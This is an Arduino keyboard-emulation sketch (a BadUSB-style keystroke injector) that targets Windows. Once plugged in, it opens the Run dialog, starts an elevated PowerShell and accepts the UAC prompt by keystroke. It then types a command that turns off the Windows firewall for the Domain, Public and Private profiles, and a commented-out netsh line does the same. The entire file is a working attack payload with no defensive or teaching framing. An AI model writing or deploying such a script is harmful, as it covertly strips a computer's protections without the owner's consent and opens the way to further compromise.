#include <Keyboard.h>
void setup() {
  delay(20000);
  
Keyboard.begin();
delay(1000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(200);
Keyboard.print("powershell Start-Process powershell -Verb runAs");
typeKey(KEY_RETURN);
delay(6000);

//Keyboard.press(KEY_LEFT_ARROW);
//Keyboard.releaseAll();
//Keyboard.press(KEY_RETURN);
//Keyboard.releaseAll();

//delay(6000);

Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(121);
Keyboard.releaseAll();
delay(2000);


Keyboard.print("Write-Host \"Disabling Firewall...\"");
typeKey(KEY_RETURN);
delay(200);
Keyboard.print("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
typeKey(KEY_RETURN);
delay(500);
//  Keyboard.print("netsh advfirewall set allprofiles state off");
//  typeKey(KEY_RETURN);
//  delay(500);
Keyboard.print("exit");
typeKey(KEY_RETURN);
delay(30);
Keyboard.end();
}
void typeKey(int key){
Keyboard.press(key);
delay(50);
Keyboard.release(key);
}
void loop() {}
